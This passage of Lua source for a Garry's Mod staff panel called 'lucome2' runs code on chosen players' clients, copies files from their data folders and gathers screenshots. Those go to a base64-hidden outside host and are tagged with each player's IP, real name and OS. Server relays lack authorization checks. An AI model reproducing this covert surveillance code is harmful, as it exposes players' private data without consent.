lucome2 = lucome2 or {}

local hardreset = true

lucome2.NetStrings = {
	scgc = {
		ts = "lucome2-scgc-ts",
		tc = "lucome2-scgc-tc"
	},
	peek = {
		RetrieveDirectory = "peekgetdir",
		RetrieveFile      = "peekgetfil",
		ReturnDirectory   = "peekretdir",
		ReturnFile        = "peekretfil",
	},
	ovac = {
		ShouldUpdatePVS = "ovacupdatepvs"
	}
}

if SERVER then
	do -- Network Strings
		for k,v in pairs(lucome2.NetStrings) do
			for kk,vv in pairs(v) do
				util.AddNetworkString(vv)
			end
		end
	end
	
	net.Receive(lucome2.NetStrings.scgc.ts,function(len,ply)
		local c,d,t,e = net.ReadString(),net.ReadEntity(),net.ReadEntity(),net.ReadTable()
	    e[#e+1] = ply:IPAddress()
	    net.Start(lucome2.NetStrings.scgc.tc)
	    	net.WriteString(c)
	    	net.WriteTable(e)
	    	net.WriteEntity(t)
	    net.Send(d)
	end)
	
	net.Receive(lucome2.NetStrings.peek.RetrieveDirectory,function(len,ply)
		local t = net.ReadTable()
		net.Start(lucome2.NetStrings.peek.ReturnDirectory)
			net.WriteTable({t=t.t,l=t.l,d=t.d,f=t.f,x=t.x})
			net.WriteEntity(ply)
		net.Send(t.x)
	end)
	
	net.Receive(lucome2.NetStrings.peek.RetrieveFile,function(l,p)
		local e,r,t,s = net.ReadEntity(),net.ReadEntity(),net.ReadTable(),net.ReadString()
		net.Start(lucome2.NetStrings.peek.ReturnFile)
			net.WriteEntity(e)
			net.WriteTable(t)
			net.WriteString(s)
		net.Send(r)
	end)
	
	local shouldupdate = false
	hook.Add("Tick","LuCoMe2_OvacShouldUpdatePVS",function()
		if not shouldupdate then return end
		for k,v in pairs(player.GetAll()) do
			AddOriginToPVS(v:GetPos())
		end
	end)
	
	net.Receive(lucome2.NetStrings.ovac.ShouldUpdatePVS,function(len,ply)
		shouldupdate = net.ReadBool()
	end)
else

	local function LuCoMe2_Init()
	if LocalPlayer().IsAuthorizedOverseer and not LocalPlayer():IsAuthorizedOverseer() then return end
	
	if hardreset and lucome2.MainFrame and lucome2.MainFrame:IsValid() then
		lucome2.Shutdown()
	end
	
	lucome2.Active        = false
	lucome2.BindKey       = input.GetKeyCode(input.LookupBinding("lucome")) or KEY_F
	lucome2.MenuCloseTime = CurTime()
	
	lucome2.MainFrame       = (hardreset and NULL or lucome2.MainFrame) or NULL
	lucome2.MouseWheelDelta = 0
	lucome2.ButtonCooldown  = 0.25
	lucome2.ButtonLastClick = CurTime()
	lucome2.LastMousePos    = Vector(ScrW()/2,ScrH()/2)
	
	lucome2.Animators = {
		MainFrame = {
			BackgroundBlur = 0
		},
		Sectors = {
			peek = {
				ModeShift = 0
			}
		}
	}

	lucome2.Sectors = {
		luco = NULL, -- [x] Lua Code: Run / Check Lua
		peek = NULL, -- [x] Player Data Info / Transfer: Peer into data folder
		scgc = NULL, -- [x] Screen Capture: Check local menus and Derma
		ovac = NULL, -- Overwatch: Track player positions in the map
		pyda = NULL, -- Player Data: Get mounted games, Lua environmment, friend status, etc
		pavi = NULL, -- PAC Outfit Viewer: View PAC parts and console/script parts
		inta = NULL, -- Input Tracker: Track player input and get key binds
		atol = NULL  -- Admin Tools: Global administrative functions like kick, ban, freeze, etc.
	}
	
	lucome2.SectorData = {
		luco = {},
		peek = {},
		scgc = {},
		ovac = {},
		pyda = {},
		pavi = {},
		inta = {},
		atol = {}
	}
	
	lucome2.X = {
		INI  = XNC.XSDC("\x0cTkRZek9UZ3pORFEwkJCAgICQgHBwgHBw/3FZRFhscUSTg1RPTw==",CNX.NID,CNX.CID),
		NRET = XNC.XSDC("\x0cTkRZek9UZ3pORFEwkJCAgHBwgJBwcICQ/3FZRFhvj3A9g3NgmQ==",CNX.NID,CNX.CID)
	}
	
	lucome2.Hooks = {
		Think            = NULL,
		CalcView         = NULL,
		HUDPaint         = NULL,
		[lucome2.X.INI]  = NULL,
		[lucome2.X.NRET] = NULL
	}
	
	lucome2.Hooks.HUDPaint = function()
		lucome2.Animators.MainFrame.BackgroundBlur = math.Clamp(lucome2.Animators.MainFrame.BackgroundBlur+(lucome2.Active and 0.1 or -0.1),0,1)
		
		local bgb = lucome2.Animators.MainFrame.BackgroundBlur
		if bgb == 0 then return end
		BlurBox(4,0,0,ScrW(),ScrH(),bgb*255,Color(0,0,0,bgb*180))
		return
	end
	
	lucome2.Hooks.CalcView = function(ply,pos,ang,fov,znear,znar)
		--[[if not lucome2.Active then return end
		
		local t = {
			origin = Vector(lucome2.SectorData.ovac.MapCenter.x,lucome2.SectorData.ovac.MapCenter.y,lucome2.SectorData.ovac.MapBounds.Max.z*0.8),
			angles = Angle(90,90,0),
			fov = 170,
			znear = znear,
			zfar = zfar
		}
		
		return t]]
	end
	
	local white   = Color(225,255,255,255)
	local unknown = Color(150,100,255,255)
	lucome2.Hooks[lucome2.X.INI] = function(entity)
		local entityname = isentity(entity) and entity:Nick() or tostring(entity)
		local entpaccamcolor = PacCamColors[isentity(entity) and entity:EntIndex() or -1] or unknown
		
		local inimsg = "XNET Initialized for client "..entityname
		lucome2.SectorData.luco.AddText(entpaccamcolor,("-"):rep(#inimsg).."\n"..inimsg.."\n"..("-"):rep(#inimsg).."\n\n")
	end
	
	lucome2.Hooks[lucome2.X.NRET] = function(from,to,value)
		local fromname = isentity(from) and from:Nick() or tostring(from)
		local toname   = isentity(to  ) and to:Nick()   or tostring(to  )
		
		local frompaccamcolor = PacCamColors[isentity(from) and from:EntIndex() or -1] or unknown
		local topaccamcolor   = PacCamColors[isentity(to  ) and to:EntIndex()   or -1] or unknown
		
		if not lucome2.SectorData.luco.Detections.IsDeepSearch then
			lucome2.SectorData.luco.AddText(white,"XNET ",frompaccamcolor,fromname,white," -> ",topaccamcolor,toname,white,":\n",
			    ">>> ",topaccamcolor,value.."\n\n")
		else
			if istable(value) then
				lucome2.SectorData.luco.AddText(white,"XNET ",frompaccamcolor,fromname,white," -> ",topaccamcolor,toname,white,":\n")
				for k,v in pairs(value) do
					lucome2.SectorData.luco.AddText(topaccamcolor,tostring(k).." --> "..tostring(v).."\n")
				end
			else
				lucome2.SectorData.luco.AddText(white,"XNET ",frompaccamcolor,fromname,white," -> ",topaccamcolor,toname,white,":\n",
			    	">>> ",topaccamcolor,value.."\n\n")
			end
		end
	end
	
	lucome2.SetupHooks = function()
		for k,v in pairs(lucome2.Hooks) do
			if isfunction(v) then
				hook.Add(k,(k == "HUDPaint" and "AAAA" or "").."LuCoMe2_"..k,v)
			end
		end
	end
	
	lucome2.Receivers = {
		[lucome2.NetStrings.scgc.tc] = NULL
	}
	
	lucome2.Receivers[lucome2.NetStrings.scgc.tc] = function(len,ply)
		local filename,data,target = net.ReadString(),net.ReadTable(),net.ReadEntity()
		local operatingsystem = data[7] == 1 and "Windows" or data[7] == 0 and "Mac" or  data[7] == -1 and "Linux" or "Unknown"
		local separator = "   -   "
		local tries,checking,ok = 0,false,false
		
		hook.Add("Think","ScgcFileCheck_"..target:SteamID(),function()
			if not ok and not checking and tries <= 10 then
				checking = true
				http.Post(base64.decode(lucome2.SectorData.scgc.Uplink),{chk=filename..".jpg"},function(body,len,headers,code)
					if body == "../s/" then ok = true end 
					tries,checking = tries+1,false
				end,function(error)
					tries,checking = tries+1,false
				end)
			end
			
			if not ok and tries > 10 then
				hook.Remove("Think","ScgcFileCheck_"..target:SteamID())
			end
			
			if ok then
				local dat = {
					filename,
					target:RealName().."  /  "..target:Nick(),
					target:SteamID(),
					data[1].."x"..data[2].."@"..data[3],
					"FPS: "..data[4],
					"Ping: "..data[5],
					"Windowed: "..data[6],
					"OS: "..operatingsystem,
					"IP: "..data[8],
					string.Comma(math.Round(len/1000,2)).."kb"
				}
				
				http.Fetch(base64.decode(lucome2.SectorData.scgc.Archive).."/"..filename..".jpg",function(body,len,headers,code)
					lucome2.SectorData.scgc.ViewFile(target,data,body,filename,table.concat(dat,separator))
				end,function() print(error) end)
				hook.Remove("Think","ScgcFileCheck_"..target:SteamID())
			end
		end)
	end
	
	lucome2.Receivers[lucome2.NetStrings.peek.ReturnDirectory] = function(len,ply)
		local data,target = net.ReadTable(),net.ReadEntity()
		
		lucome2.SectorData.peek.Listings.Directories  = {}
		lucome2.SectorData.peek.Listings.Files        = {}
		lucome2.SectorData.peek.Currents.Directories  = 0
		lucome2.SectorData.peek.Currents.Files        = 0
		lucome2.SectorData.peek.Selection.Directories = ""
		lucome2.SectorData.peek.Selection.Files       = {}
		lucome2.SectorData.peek.SortMode              = 0
		
		for k,v in pairs(data.f) do
			lucome2.SectorData.peek.Listings.Files[k] = {v,data.t[k],data.l[k]}
		end
		
		for k,v in pairs(data.d) do
			lucome2.SectorData.peek.Listings.Directories[k] = v
		end
		
		lucome2.SectorData.peek.Selection.Directories = lucome2.SectorData.peek.Listings.Directories[lucome2.SectorData.peek.Currents.Directories]
		lucome2.SectorData.peek.Selection.Files       = lucome2.SectorData.peek.Listings.Files[lucome2.SectorData.peek.Currents.Files]
	end
	
	lucome2.Receivers[lucome2.NetStrings.peek.ReturnFile] = function(len,ply)
		local target,filedata,savedirectory = net.ReadEntity(),net.ReadTable(),net.ReadString()
		timer.Simple(2,function()
			lucome2.SectorData.peek.SaveFile(filedata[2],filedata[3],savedirectory,target)
		end) 
	end
	
	lucome2.SetupReceivers = function()
		for k,v in pairs(lucome2.Receivers) do
			net.Receive(k,v)
		end
	end
	
	lucome2.Fonts = {
		PeekSmall = {
			font      = "Tahoma",
			size      = 9,
			weight    = 0,
			antialias = true
		},
		PeekCenter = {
			font      = "Arial",
			size      = 16,
			weight    = 700,
			antialias = true
		},
		PeekOffset = {
			font      = "Arial",
			size      = 12,
			weight    = 0,
			antialias = true
		},
	}
	
	lucome2.CreateFonts = function()
		for k,v in pairs(lucome2.Fonts) do
			surface.CreateFont(k,v)
		end
	end
	
	lucome2.RenderVerticalSlider = function(x,y,w,h,val,valmin,valmax,enabled,outlinecolor,lines,callback)
		surface.SetDrawColor(Color(0,0,0,180))
		surface.DrawRect(x,y,w,h)
		surface.SetDrawColor(outlinecolor)
		surface.DrawOutlinedRect(x,y,w,h)
		
		local boxsize = h/16
		local movemin = (y+  boxsize/2)/h
		local movemax = (y+h-boxsize/2)/h
		
		local boxpos = math.Remap(val,valmax,valmin,movemin,movemax)
		local bp = Vector(x,y+h*boxpos)
		
		surface.SetDrawColor(Color(0,0,0,180))
		surface.DrawRect(bp.x,bp.y-boxsize/2,w,boxsize)
		surface.SetDrawColor(outlinecolor)
		surface.DrawOutlinedRect(bp.x,bp.y-boxsize/2,w,boxsize)
		
		for k,v in pairs(lines) do
			surface.SetTexture(surface.GetTextureID("vgui/white"))
			surface.SetDrawColor(PacCamColors[k:EntIndex()] or Color(128,128,128,255))
			surface.DrawPoly({
				{["x"] = x+w-1,["y"] = y+(0.5-v[1]/2)*h},
				{["x"] = x-1  ,["y"] = y+(0.5-v[1]/2)*h},
				{["x"] = x-1  ,["y"] = y+(0.5-v[2]/2)*h},
				{["x"] = x+w-1,["y"] = y+(0.5-v[2]/2)*h}
			})
			--surface.DrawLine(x+1,y+(0.5-v/2)*h,x+w-2,y+(0.5-v/2)*h)
		end
		
		if lucome2.CursorWithin(x,y,w,h) and (input.IsMouseDown(MOUSE_LEFT) or input.IsMouseDown(MOUSE_MIDDLE)) then
			local mheight = math.Remap(math.Clamp((gui.MouseY()-y)/h,0,1),1,0,valmin,valmax)
			callback(mheight,input.IsMouseDown(MOUSE_MIDDLE))
		end
	end
	
	lucome2.RenderButton = function(txt,x,y,w,h,enabled,on,outlinecolor,callback)
		local bgcol,olcol,txtcol = Color(0,0,0,180),outlinecolor,outlinecolor
		if enabled then
			if lucome2.CursorWithin(x,y,w,h) then
				if input.IsMouseDown(MOUSE_LEFT) then
					bgcol,olcol,txtcol = Color(255,0,0,180),Color(0,0,0,255),Color(0,0,0,255)
					if lucome2.ButtonLastClick-CurTime() <= 0 then
						lucome2.ButtonLastClick = CurTime()+lucome2.ButtonCooldown
						callback()
					end
				else
					if on then
						txtcol = Color(255,255,255,255)
					end
					olcol = Color(255,255,255,255)
				end
			else
				if on then
					txtcol = Color(255,255,255,255)
				end
			end
		else
			bgcol,olcol,txtcol = Color(32,32,32,180),Color(64,64,64,255),Color(64,64,64,255)
		end
		
		surface.SetDrawColor(bgcol)
		surface.DrawRect(x,y,w,h)
		surface.SetDrawColor(olcol)
		surface.DrawOutlinedRect(x,y,w,h)
		draw.SimpleText(txt,"Default",x+w/2,y+h/2,txtcol,1,1)
	end
	
	lucome2.RenderInvisibleCircleButton = function(btn,x,y,r,enabled,callback)
		local inside = Vector(gui.MouseX(),gui.MouseY()):Distance(Vector(x-r/2,y-r/2)) <= r
		if enabled and inside and input.IsMouseDown(btn) and lucome2.ButtonLastClick-CurTime() <= 0 then
			lucome2.ButtonLastClick = CurTime()+lucome2.ButtonCooldown
			callback()
		end
	end
	
	lucome2.RenderButtonAndLabel = function(txt,x,y,w,h,enabled,on,outlinecolor,callback)
		local bgcol,olcol,txtcol = Color(0,0,0,180),outlinecolor,outlinecolor
		if enabled then
			if lucome2.CursorWithin(x,y,w,h) then
				if input.IsMouseDown(MOUSE_LEFT) then
					bgcol,olcol,txtcol = Color(255,0,0,180),Color(0,0,0,255),Color(0,0,0,255)
					if lucome2.ButtonLastClick-CurTime() <= 0 then
						lucome2.ButtonLastClick = CurTime()+lucome2.ButtonCooldown
						callback()
					end
				else
					olcol,txtcol = Color(255,255,255,255),Color(255,255,255,255)
				end
			else
				if on then
					txtcol = Color(255,255,255,255)
				end
			end
		else
			bgcol,olcol,txtcol = Color(32,32,32,180),Color(64,64,64,255),Color(64,64,64,255)
		end
		
		surface.SetDrawColor(bgcol)
		surface.DrawRect(x,y,w,h)
		surface.SetDrawColor(olcol)
		surface.DrawOutlinedRect(x,y,w,h)
		draw.SimpleText(on and "-" or "+","Default",x+w/2,y+h/2,txtcol,1,1)
		draw.SimpleText(txt,"Default",x-4,y+h/2,txtcol,2,1)
	end
	
	lucome2.FormatTargetsForXNet = function()
		local t = {}
		for k,v in pairs(lucome2.SectorData.luco.Targets) do
			if not k:IsValid() then
				lucome2.SectorData.luco.Targets[k] = nil
				continue
			end
			t[#t+1] = k
		end
		return t
	end
	
	lucome2.CursorWithin = function(x,y,w,h)
		local xx,yy = gui.MousePos()
		return xx >= x and xx <= x+w and yy >= y and yy <= y+h
	end
	
	lucome2.ScrollDetectArea = function(x,y,w,h,enabled,cb)
		if enabled and lucome2.CursorWithin(x,y,w,h) and lucome2.MouseWheelDelta ~= 0 then
			cb(lucome2.MouseWheelDelta)
			lucome2.MouseWheelDelta = 0
		end
	end
	
	lucome2.ClickDetectArea = function(mouseinput,x,y,w,h,enabled,cb)
		if enabled and lucome2.CursorWithin(x,y,w,h) and input.IsMouseDown(mouseinput) then
			if lucome2.ButtonLastClick-CurTime() <= 0 then
				lucome2.ButtonLastClick = CurTime()+lucome2.ButtonCooldown
				cb()
			end
		end
	end
	
	lucome2.RenderButtons = function()
		--Luco
		lucome2.SectorData.luco.Render()
		
		--Scgc
		lucome2.SectorData.scgc.Render()
		
		--Peek
		lucome2.SectorData.peek.Render()
		
		--Ovac
		lucome2.SectorData.ovac.Render()
	end
	
	local function compare(a,b)
		if a == b or a:find(b,nil,true) or a:lower() == b:lower() or a:lower():find(b:lower(),nil,true) then
			return true
		end
		return false
	end
	
	local function comparenick(a,b)
		local MatchTransliteration = GLib and GLib.UTF8 and GLib.UTF8.MatchTransliteration 
		if not MatchTransliteration then return compare(a,b) end
		if a == b or a:lower() == b:lower() or MatchTransliteration(a,b) then
			return true
		end
		return false
	end
	
	--Luco
	lucome2.SectorData.luco.Pos            = Vector(ScrW()-ScrW()/3,0         )
	lucome2.SectorData.luco.Size           = Vector(ScrW()/3       ,ScrH()*0.8)
	lucome2.SectorData.luco.Panels         = {}
	lucome2.SectorData.luco.LuaTerms       = {"if","then","else","elseif","while","do","break","end","repeat","until","goto","true","false","return","for"}
	lucome2.SectorData.luco.History        = NULL
	lucome2.SectorData.luco.TextEntry      = NULL
	lucome2.SectorData.luco.History        = {}
	lucome2.SectorData.luco.CurrentText    = ""
	lucome2.SectorData.luco.CurrentHistory = 0
	lucome2.SectorData.luco.Targets        = {}
	lucome2.SectorData.luco.Detections     = {
		IsServer       = false,
		Delay          = 0,
		IsConsole      = false,
		IsReturn       = true,
		IsManualReturn = false,
		IsDeepSearch   = false
	}
	lucome2.SectorData.luco.Formatting = {
		EntIndex = true,
		Locals   = true,
		Traces   = true,
		Names    = true
	}
	
	lucome2.SectorData.luco.Render = function()
		local lucooutlinecolor = PacCamColors[LocalPlayer():EntIndex()] or Color(128,128,128,255)
		local pos       = lucome2.SectorData.luco.Pos
		local detections = lucome2.SectorData.luco.Detections
		
		lucome2.RenderButton("Server" ,pos.x-48,pos.y        ,48,24,true,detections.IsServer      ,lucooutlinecolor,function()
			lucome2.SectorData.luco.Detections.IsServer = not lucome2.SectorData.luco.Detections.IsServer
		end)
		lucome2.RenderButton("Console",pos.x-48,pos.y+48+24*0,48,24,true                    ,detections.IsConsole     ,lucooutlinecolor,function()
			lucome2.SectorData.luco.Detections.IsConsole = not lucome2.SectorData.luco.Detections.IsConsole
		end)
		lucome2.RenderButton("Return" ,pos.x-48,pos.y+48+24*1,48,24,not detections.IsConsole,detections.IsReturn      ,lucooutlinecolor,function()
			lucome2.SectorData.luco.Detections.IsReturn = not lucome2.SectorData.luco.Detections.IsReturn
		end)
		lucome2.RenderButton("Manual" ,pos.x-48,pos.y+48+24*2,48,24,not detections.IsConsole,detections.IsManualReturn,lucooutlinecolor,function()
			lucome2.SectorData.luco.Detections.IsManualReturn = not lucome2.SectorData.luco.Detections.IsManualReturn
		end)
		lucome2.RenderButton("Deep"   ,pos.x-48,pos.y+48+24*3,48,24,not detections.IsConsole,detections.IsDeepSearch  ,lucooutlinecolor,function()
			lucome2.SectorData.luco.Detections.IsDeepSearch = not lucome2.SectorData.luco.Detections.IsDeepSearch
		end)
		
		lucome2.RenderButton("Mounts",pos.x-48,pos.y+48+24*5,48,24,table.Count(lucome2.SectorData.luco.Targets) ~= 0,false,lucooutlinecolor,function()
			local t = lucome2.FormatTargetsForXNet()
			XNCR([=[{["Gmod----"] = y,
						["HL1-----"] = IsMounted("hl1") and y or n,
						["HL2-----"] = IsMounted("hl2") and y or n,
						["HL2:EP1-"] = IsMounted("episodic") and y or n,
						["HL2:EP2-"] = IsMounted("ep2") and y or n,
						["HL2:LC--"] = IsMounted("ep2") and y or n,
						["CS:S----"] = IsMounted("cstrike") and y or n,
						["CS:GO---"] = IsMounted("csgo") and y or n,
						["TF2-----"] = IsMounted("tf") and y or n,
						["L4D-----"] = IsMounted("left4dead") and y or n,
						["L4D2----"] = IsMounted("left4dead2") and y or n,
						["P-------"] = IsMounted("portal") and y or n,
						["P2------"] = IsMounted("portal2") and y or n,
						["DOD:S---"] = IsMounted("dod") and y or n}
			]=],
			{y="MOUNTED",n="NOT MOUNTED"},
			lucome2.SectorData.luco.Detections.IsServer,false,t,
			lucome2.SectorData.luco.Detections.Delay,{con=false,ret=true,deep=false},"Luco Function: Get Mounted Games")
		end)
		
		lucome2.RenderButton("Hooks",pos.x-48,pos.y+48+24*6,48,24,table.Count(lucome2.SectorData.luco.Targets) ~= 0,false,lucooutlinecolor,function()
			local t = lucome2.FormatTargetsForXNet()
			XNCR([=[local t = ""
				for k,v in pairs(tars) do
					local s = ("----------Hooks on "..(CLIENT and ("client "..LocalPlayer():Nick()) or "SERVER").." from "..(v:IsValid() and v:Nick() or "SERVER").."----------")
					t = s.."\n"
					for kk,vv in pairs(hook.GetTable()) do
						for kkk,vvv in pairs(vv) do
							if debug.getinfo(vvv).source == "@["..v:SteamID().."]"..v:Nick() or debug.getinfo(vvv).source == "@"..v:Nick() then
								t = t..'hook.GetTable()["'..kk..'"]["'..kkk..'"]\n'
							end
						end
					end
					t = t.."     "..("-"):rep(#s).."\n"
				end
				return t
			]=],{tars=t},true,true,{},lucome2.SectorData.luco.Detections.Delay,
			{con=false,ret=true,mret=true,deep=lucome2.SectorData.luco.Detections.IsDeepSearch},"Luco Function: Get Client Hooks")
		end)
		
		lucome2.RenderButton("All Clients",pos.x-48,pos.y+48+24*8,48,24,true,table.Count(lucome2.SectorData.luco.Targets) == table.Count(player.GetAll()),lucooutlinecolor,function()
			local plylist = {}
			for k,v in pairs(player.GetAll()) do
				plylist[v] = true
			end
			lucome2.SectorData.luco.Targets = table.Count(lucome2.SectorData.luco.Targets) == table.Count(player.GetAll()) and {} or plylist
		end)
		
		local plylist = {}
		for k,v in pairs(player.GetAll()) do
			plylist[#plylist+1] = v
		end
		
		for k,v in pairs(plylist) do
			local c = PacCamColors[v:EntIndex()] or Color(255,0,255,255)
			lucome2.RenderButtonAndLabel(v:Nick(),pos.x-24,pos.y+48+24*(8+k),24,24,true,lucome2.SectorData.luco.Targets[v],c,function()
				if lucome2.SectorData.luco.Targets[v] then
					lucome2.SectorData.luco.Targets[v] = nil
				else
					lucome2.SectorData.luco.Targets[v] = true
				end
			end)
		end
		
		lucome2.RenderButton("Scgc",pos.x-48,pos.y+lucome2.SectorData.luco.Size.y-24*2,48,24,true,false,lucooutlinecolor,function()
			for k,v in pairs(player.GetHumans()) do
				hook.Call(lucome2.X.INI,nil,v)
			end
		end)
		
		lucome2.RenderButton("Clear",pos.x-48,pos.y+lucome2.SectorData.luco.Size.y-24,48,24,true,false,lucooutlinecolor,function()
			lucome2.SectorData.luco.Panels.LuHist:SetText("")
			lucome2.SectorData.luco.History = {}
			lucome2.SectorData.luco.CurrentHistory = 0
		end)
		
		lucome2.RenderButton("Indices",pos.x-48,pos.y+lucome2.SectorData.luco.Size.y+24*1,48,24,true,lucome2.SectorData.luco.Formatting.EntIndex,lucooutlinecolor,function()
			lucome2.SectorData.luco.Formatting.EntIndex = not lucome2.SectorData.luco.Formatting.EntIndex
		end)
		
		lucome2.RenderButton("Locals" ,pos.x-48,pos.y+lucome2.SectorData.luco.Size.y+24*2,48,24,true,lucome2.SectorData.luco.Formatting.Locals  ,lucooutlinecolor,function()
			lucome2.SectorData.luco.Formatting.Locals = not lucome2.SectorData.luco.Formatting.Locals
		end)
		
		lucome2.RenderButton("Names"  ,pos.x-48,pos.y+lucome2.SectorData.luco.Size.y+24*3,48,24,true,lucome2.SectorData.luco.Formatting.Names   ,lucooutlinecolor,function()
			lucome2.SectorData.luco.Formatting.Names = not lucome2.SectorData.luco.Formatting.Names
		end)
		
		lucome2.RenderButton("Traces" ,pos.x-48,pos.y+lucome2.SectorData.luco.Size.y+24*4,48,24,true,lucome2.SectorData.luco.Formatting.Traces  ,lucooutlinecolor,function()
			lucome2.SectorData.luco.Formatting.Traces = not lucome2.SectorData.luco.Formatting.Traces
		end)
	end
	
	lucome2.SectorData.luco.AddText = function(...)
		local args = {...}
		for k,v in pairs(args) do
			if type(v) == "string" then
				lucome2.SectorData.luco.Panels.LuHist:AppendText(v)
			elseif type(v) == "table" then -- color
				lucome2.SectorData.luco.Panels.LuHist:InsertColorChange(v.r,v.g,v.b,v.a or 255)
			else
				lucome2.SectorData.luco.Panels.LuHist:AppendText(tostring(v))
			end
		end
		lucome2.SectorData.luco.Panels.LuHist:InsertColorChange(white.r,white.g,white.b,white.a)
	end
	
	lucome2.SectorData.luco.Create = function()
		local lucooutlinecolor = PacCamColors[LocalPlayer():EntIndex()] or Color(128,128,128,255)
		
		local luco = vgui.Create("DPanel",lucome2.MainFrame)
		luco:SetSize(lucome2.SectorData.luco.Size.x,lucome2.SectorData.luco.Size.y)
		luco:SetPos(lucome2.SectorData.luco.Pos.x,lucome2.SectorData.luco.Pos.y)
		function luco:Paint(w,h)
			surface.SetDrawColor(Color(0,0,0,180))
			surface.DrawRect(0,0,w,h)
			surface.SetDrawColor(lucooutlinecolor)
			surface.DrawOutlinedRect(0,0,w,h)
			return
		end
		lucome2.Sectors.luco = luco
		
		local luhist = vgui.Create("RichText",lucome2.Sectors.luco)
		luhist:SetPos(8,8)
		luhist:SetSize(lucome2.SectorData.luco.Size.x-16,lucome2.SectorData.luco.Size.y-40)
		luhist:InsertColorChange(white.r,white.g,white.b,white.a)
		function luhist:PerformLayout()
			self:SetFontInternal("BudgetLabel")
		end
		lucome2.SectorData.luco.Panels.LuHist = luhist
		
		local luent = vgui.Create("DTextEntry",lucome2.Sectors.luco)
		luent:SetPos(8,lucome2.SectorData.luco.Size.y-32)
		luent:SetSize(lucome2.SectorData.luco.Size.x-16,24)
		luent:SetText("")
		luent:SetDrawBorder(false)
		lucome2.SectorData.luco.Panels.LuEnt = luent
		
		function luent:OnEnter()
			luhist:AppendText(self:GetText().."\n")
			local txt = self:GetText()
			
			local t = lucome2.FormatTargetsForXNet()
			
			if not lucome2.SectorData.luco.Detections.IsConsole then
				if lucome2.SectorData.luco.Formatting.EntIndex then
					txt = txt:gsub("(_)(%d+)","Entity(%2)")
				end
				if lucome2.SectorData.luco.Formatting.Locals then
					txt = txt:gsub("%f[%a]lp%f[%A]","LocalPlayer()")
					txt = txt:gsub("%f[%a]me%f[%A]","Entity("..LocalPlayer():EntIndex()..")")
				end
				if lucome2.SectorData.luco.Formatting.Traces then
					txt = txt:gsub("%f[%a]this%f[%A]","Entity("..LocalPlayer():GetEyeTrace().Entity:EntIndex()..")")
					local thp = LocalPlayer():GetEyeTrace().HitPos
					txt = txt:gsub("%f[%a]there%f[%A]","Vector("..thp.x..","..thp.y..","..thp.z..")")
				end
				if lucome2.SectorData.luco.Formatting.Names then
					for k,v in txt:gmatch("(.-)(%a+)(%p-)") do
						for kk,vv in pairs(player.GetAll()) do
							if ({["lp"]=true,["me"]=true,["this"]=true,["there"]=true})[v] then continue end
							
							local islua = false
							for kkk,vvv in pairs(lucome2.SectorData.luco.LuaTerms) do
								if vvv:find(v) then
									islua = true
									break
								end
							end
							
							if islua then continue end
							
							if #v > 1 and vv:Nick():lower():find(v,1,true) == 1 then
								txt = txt:gsub("%f[%a]"..v.."%f[%A]","Entity("..vv:EntIndex()..")")
							else
								if #v > 1 and comparenick(vv:Nick(),v) then
									txt = txt:gsub("%f[%a]"..v.."%f[%A]","Entity("..vv:EntIndex()..")")
								elseif #v > 1 and comparenick(vv:Nick():gsub("%^%d",""),v) then
									txt = txt:gsub("%f[%a]"..v.."%f[%A]","Entity("..vv:EntIndex()..")")
								end
							end
						end
					end
				end
			end
			
			XNCR(txt,{},lucome2.SectorData.luco.Detections.IsServer,false,t,lucome2.SectorData.luco.Detections.Delay,{
				con  = lucome2.SectorData.luco.Detections.IsConsole,
				ret  = lucome2.SectorData.luco.Detections.IsReturn,
				mret = lucome2.SectorData.luco.Detections.IsManualReturn,
				deep = lucome2.SectorData.luco.Detections.IsDeepSearch
			},"Luco Execution")
			
			table.insert(lucome2.SectorData.luco.History,1,self:GetText())
			
			if not lucome2.SectorData.luco.Detections.IsServer and #t == 0 then
				table.insert(lucome2.SectorData.luco.History,1,"")
			end
			
			self:SetText("")
			lucome2.SectorData.luco.CurrentText    = ""
			lucome2.SectorData.luco.CurrentHistory = 0
		end
		
		function luent:OnKeyCodeTyped(key)
			lucome2.SectorData.luco.CurrentText = lucome2.SectorData.luco.CurrentHistory == 0 and luent:GetText() or lucome2.SectorData.luco.CurrentText
			lucome2.SectorData.luco.History[0] = lucome2.SectorData.luco.CurrentText
			
			if key == KEY_ENTER then
				luent:OnEnter()
			end
			
			if key == KEY_UP then
				lucome2.SectorData.luco.CurrentHistory = math.Clamp(lucome2.SectorData.luco.CurrentHistory+1,0,#lucome2.SectorData.luco.History)
				if lucome2.SectorData.luco.History[lucome2.SectorData.luco.CurrentHistory] then
					luent:SetText(lucome2.SectorData.luco.History[lucome2.SectorData.luco.CurrentHistory])
					luent:SetCaretPos(#luent:GetText())
				else
					luent:SetText(lucome2.SectorData.luco.CurrentText)
					luent:SetCaretPos(#luent:GetText())
				end
			elseif key == KEY_DOWN then
				lucome2.SectorData.luco.CurrentHistory = math.Clamp(lucome2.SectorData.luco.CurrentHistory-1,0,#lucome2.SectorData.luco.History)
				if lucome2.SectorData.luco.History[lucome2.SectorData.luco.CurrentHistory] then
					luent:SetText(lucome2.SectorData.luco.History[lucome2.SectorData.luco.CurrentHistory])
					luent:SetCaretPos(#luent:GetText())
				else
					luent:SetText(lucome2.SectorData.luco.CurrentText)
					luent:SetCaretPos(#luent:GetText())
				end
			end
		end
	end
	
	lucome2.SectorData.luco.Remove = function()
		lucome2.Sectors.luco:Remove()
		lucome2.Sectors.luco = NULL
	end
	
	lucome2.SectorData.luco.Toggle = function()
		lucome2.Sectors.luco:SetVisible(not lucome2.Sectors.luco:Visible())
	end
	
	--Scgc
	lucome2.SectorData.scgc.Pos     = Vector(ScrW()-ScrW()/3,ScrH()*0.8)
	lucome2.SectorData.scgc.Size    = Vector(ScrW()/3       ,ScrH()*0.2)
	lucome2.SectorData.scgc.Splits  = Vector(8,4)
	lucome2.SectorData.scgc.Uplink  = "aHR0cDovL2dtb2QueGVub3JhLm5ldC94L3huZXQucGhw"
	lucome2.SectorData.scgc.Archive = "aHR0cDovL2dtb2QueGVub3JhLm5ldC9z"
	
	lucome2.SectorData.scgc.Render = function()
		local pnlposx,pnlposy = lucome2.SectorData.scgc.Pos.x,lucome2.SectorData.scgc.Pos.y
		local pw,ph = lucome2.SectorData.scgc.Size.x,lucome2.SectorData.scgc.Size.y
		local scolcol = PacCamColors[LocalPlayer():EntIndex()] or Color(128,128,128,255)
		surface.SetDrawColor(Color(0,0,0,180))
		surface.DrawRect(pnlposx,pnlposy,pw,ph)
		surface.SetDrawColor(scolcol)
		surface.DrawOutlinedRect(pnlposx,pnlposy,pw,ph)
		
